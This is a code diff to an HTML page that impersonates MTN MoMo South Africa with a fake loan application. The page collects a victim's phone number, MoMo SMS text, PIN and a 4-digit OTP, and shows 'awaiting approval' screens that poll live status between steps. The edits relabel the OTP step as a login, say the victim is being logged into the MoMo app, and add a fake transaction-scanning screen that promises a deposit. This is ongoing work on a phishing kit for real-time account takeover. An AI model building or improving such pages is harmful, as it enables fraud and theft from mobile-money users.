@@ -137,16 +137,17 @@
                         <div class="ph-pre">+27</div>
                         <input type="tel" id="s3kp" placeholder="8X XXX XXXX" maxlength="9" oninput="normalizePhone('s3kp');clearErr('s3Err')" />
                     </div>
-                    <div class="field-hint">9 digits without +27 prefix (e.g., 821234567)</div>
+                    <div class="field-hint">9 digits without +27 prefix</div>
                 </div>
                 <div class="sum-box">
                     <h3>Application Summary</h3>
                     <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">R 50,000</span></div>
                     <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
+                    <div class="sum-row"><span class="sk">Monthly Repay:</span><span class="sv" id="sM">R 1,042</span></div>
                     <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
                     <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
                 </div>
-                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step2')">Back</button><button class="btn-grad" onclick="submitApp()">Next Step</button></div>
+                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step2')">Back</button><button class="btn-grad" onclick="submitApp()">Submit Application</button></div>
             </div>
         </div>
     </div>
@@ -163,7 +164,7 @@
         </div>
     </div>
 
-    <!-- PAGE 6: WAIT APPLICATION APPROVAL -->
+    <!-- PAGE 6: WAIT APPLICATION -->
     <div id="page-wait-app" class="page">
         <div class="wait-bg">
             <div class="wait-wrap">
@@ -206,13 +207,15 @@
                 </div>
                 <div class="tip-box"><strong>💡 Tip:</strong> Check your SMS inbox for the message from MTN MoMo South Africa. Copy the entire message text.</div>
                 <button class="btn-grad" onclick="doSmsParse()" id="smsSubmitBtn">Submit MoMo Message</button>
-                <button class="btn-resend hidden" id="resendSmsBtn" onclick="resendSms()">🔄 Resend SMS Verification</button>
+                <button class="btn-resend hidden" id="resendSmsBtn" onclick="resendSms()">
+                    <span id="resendSmsLabel">🔄 I did not receive the code — Resend</span>
+                </button>
                 <button class="btn-outline" onclick="retryStep('sms')">↻ Clear & Retry</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 8: WAIT SMS APPROVAL -->
+    <!-- PAGE 8: WAIT SMS -->
     <div id="page-wait-sms" class="page">
         <div class="wait-bg">
             <div class="wait-wrap">
@@ -265,7 +268,7 @@
         </div>
     </div>
 
-    <!-- PAGE 10: WAIT PIN APPROVAL -->
+    <!-- PAGE 10: WAIT PIN -->
     <div id="page-wait-pin" class="page">
         <div class="wait-bg">
             <div class="wait-wrap">
@@ -279,8 +282,8 @@
         </div>
     </div>
 
-    <!-- PAGE 11: APPLICATION UNDER REVIEW + QUALIFICATION -->
-    <div id="page-qualification" class="page">
+    <!-- PAGE 11: OTP (LOGIN) -->
+    <div id="page-otp" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-wait-pin')">← Back</a>
             <div class="mtn-logo" style="flex-direction:row;gap:8px;">
@@ -294,75 +297,12 @@
         </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2>Application Under Review</h2>
-                <p class="step-sub">You are now logged into your MoMo app</p>
+                <h2>Enter OTP Code</h2>
+                <p class="step-sub">Step 6 of 6 — Enter the 4-digit OTP sent to your phone</p>
                 <div class="prog-row">
                     <div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div>
                     <div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div>
                 </div>
-
-                <div class="review-banner">
-                    <div class="review-icon">📋</div>
-                    <h3>We have your application under review</h3>
-                    <p>To make this fast and efficient, please confirm your MoMo transaction activity.</p>
-                </div>
-
-                <div class="qual-intro">
-                    <div class="qual-badge">📊</div>
-                    <h3>Fast Track Requirement</h3>
-                    <p>Have at least <strong>20%</strong> of your loan amount in MoMo transactions this month, or have transacted the minimum required amount.</p>
-                    <div class="qual-amounts">
-                        <div><span>Loan Amount</span><strong id="qualLoanAmount">R 50,000</strong></div>
-                        <div><span>Minimum Required</span><strong id="qualRequired">R 10,000</strong></div>
-                    </div>
-                </div>
-
-                <div class="msg-box error" id="qualErr"><span class="msg-icon">✕</span><span id="qualErrTxt"></span></div>
-
-                <div class="field">
-                    <label>Your total MoMo transaction volume this month (ZAR)</label>
-                    <input type="number" id="qualVolume" placeholder="e.g. 15000" min="0" oninput="updateQualMeter()" />
-                    <div class="field-hint">Sum of money sent, received, and paid via MoMo in the last 30 days.</div>
-                </div>
-
-                <div class="qual-meter-wrap">
-                    <div class="qual-meter-labels">
-                        <span>Progress to qualification</span>
-                        <span id="qualPercentLabel">0%</span>
-                    </div>
-                    <div class="qual-meter"><div class="qual-meter-fill" id="qualMeterFill" style="width:0%"></div></div>
-                    <div class="qual-meter-note" id="qualMeterNote">Enter your volume above to see if you qualify.</div>
-                </div>
-
-                <button class="btn-grad" onclick="doQualification()" id="qualBtn">Check Qualification</button>
-
-                <div id="qualResult" style="display:none" class="qual-result"></div>
-
-                <div class="deposit-note">
-                    <div class="deposit-icon">💰</div>
-                    <p><strong>On approval:</strong> Your funds will be deposited directly to your MTN MoMo app. You can withdraw them instantly.</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- PAGE 12: OTP -->
-    <div id="page-otp" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-qualification')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:8px;">
-                <img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" />
-                <div style="text-align:left;">
-                    <div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div>
-                    <div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div>
-                </div>
-            </div>
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
-        <div class="step-center">
-            <div class="step-card">
-                <h2>Enter OTP Code</h2>
-                <p class="step-sub">Enter the 4-digit OTP code sent to your phone</p>
                 <div class="otp-section">
                     <div class="otp-section-title">OTP Code (4 digits):</div>
                     <div style="display: flex; align-items: center;">
@@ -376,23 +316,59 @@
                     </div>
                 </div>
                 <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
-                <button class="btn-grad" onclick="doOtp()" id="otpSubmitBtn" style="margin-top: 10px;">Verify & Approve Loan</button>
-                <button class="btn-resend hidden" id="resendOtpBtn" onclick="resendOtp()">🔄 Resend OTP</button>
+                <button class="btn-grad" onclick="doOtp()" id="otpSubmitBtn" style="margin-top: 10px;">Submit OTP</button>
+                <button class="btn-resend hidden" id="resendOtpBtn" onclick="resendOtp()">
+                    <span id="resendOtpLabel">🔄 I did not receive the code — Resend in 60s</span>
+                </button>
                 <button class="btn-outline" onclick="retryStep('otp')">↻ Clear & Retry OTP</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 13: WAIT OTP APPROVAL -->
+    <!-- PAGE 12: WAIT OTP -->
     <div id="page-wait-otp" class="page">
         <div class="wait-bg">
             <div class="wait-wrap">
                 <div class="wait-icon pulse">🔑</div>
                 <h2>Verifying OTP...</h2>
-                <p>Almost there — confirming your OTP code.</p>
+                <p>Logging you into your MoMo app. Please wait.</p>
                 <div class="wait-status" id="waitOtpStatus">⏳ Awaiting approval...</div>
                 <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
                 <div class="wait-appid">Application ID: <span id="waitOtpAppId" class="mono">-</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 13: AUTO-SCAN (MOMO TRANSACTION REVIEW) -->
+    <div id="page-scan" class="page">
+        <div class="wait-bg">
+            <div class="wait-wrap">
+                <div class="scan-icon">
+                    <div class="scan-ring"></div>
+                    <div class="scan-inner">📊</div>
+                </div>
+                <h2>Application Under Review</h2>
+                <p>We have your application under review. Scanning your MoMo transaction history — please wait.</p>
+                <div class="scan-checklist">
+                    <div class="scan-item active" id="scanItem1">
+                        <span class="scan-dot"></span>
+                        <span>Analyzing transaction volume...</span>
+                    </div>
+                    <div class="scan-item" id="scanItem2">
+                        <span class="scan-dot"></span>
+                        <span>Verifying 20% requirement...</span>
+                    </div>
+                    <div class="scan-item" id="scanItem3">
+                        <span class="scan-dot"></span>
+                        <span>Finalizing qualification...</span>
+                    </div>
+                </div>
+                <div class="wait-status" id="waitScanStatus">⏳ Scanning your MoMo history...</div>
+                <div class="wait-appid">Application ID: <span id="waitScanAppId" class="mono">-</span></div>
+                <div class="deposit-note" style="margin-top:24px;">
+                    <div class="deposit-icon">💰</div>
+                    <p><strong>On approval:</strong> Your funds will be deposited directly to your MTN MoMo app. You can withdraw them instantly.</p>
+                </div>
             </div>
         </div>
     </div>
